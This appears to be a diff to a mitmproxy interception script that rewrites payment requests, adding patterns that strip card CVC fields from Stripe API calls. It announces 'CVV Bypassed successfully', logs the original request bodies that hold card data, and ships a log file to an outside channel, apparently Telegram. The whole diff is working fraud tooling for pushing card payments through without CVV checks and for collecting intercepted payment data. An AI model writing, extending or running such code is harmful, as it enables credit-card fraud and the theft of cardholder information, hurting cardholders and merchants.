@@ -48,6 +48,9 @@ REGEX_PATTERNS = [
 
 # Precompiled regex patterns specifically for api.stripe.com
 STRIPE_SPECIFIC_PATTERNS = [
+    re.compile(rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}"),
+    re.compile(rb"card\[cvc\]=[\d]{3,4}"),
+    re.compile(rb"source_data\[card\]\[cvc\]=[\d]{3,4}"),
     re.compile(rb"payment_method_data\[payment_user_agent\]=[^&]*"),
     re.compile(rb"payment_method_data\[time_on_page\]=[^&]*"),
     re.compile(rb"payment_method_data\[pasted_fields\]=[^&]*"),
@@ -157,26 +160,27 @@ def modify_request(flow: http.HTTPFlow):
     """
     Modifies the intercepted request to remove CVV data, payment user agent, and other specified fields.
     """
-    log_request_body(flow, "Original Request Body")
-
     if "api.stripe.com" in flow.request.pretty_url:
         # Remove specified fields from the Stripe request data
         modified_body, data_removed = remove_patterns_from_request_body(flow.request.content, STRIPE_SPECIFIC_PATTERNS)
         if data_removed:
-            send_telegram_notification("Stripe-specific data removed successfully")
+            log_request_body(flow, "Original Request Body")
+            send_telegram_notification("Cvv Bypassed for stripe successfully")
             send_log_file()
     else:
         # Remove CVV codes and other sensitive data from the request data
         modified_body, data_removed = remove_patterns_from_request_body(flow.request.content, REGEX_PATTERNS)
         if data_removed:
-            send_telegram_notification("cvv removed successfully")
+            log_request_body(flow, "Original Request Body")
+            send_telegram_notification("CVV Bypassed successfully")
             send_log_file()
 
     # Clean up any trailing characters if necessary
     modified_body = clean_up_trailing_characters(modified_body)
 
     # Log the modified request data for debugging
-    log_request_body(flow, "Modified Request Body")
+    if data_removed:
+        log_request_body(flow, "Modified Request Body")
 
     # Set the modified body back to the request
     flow.request.content = modified_body
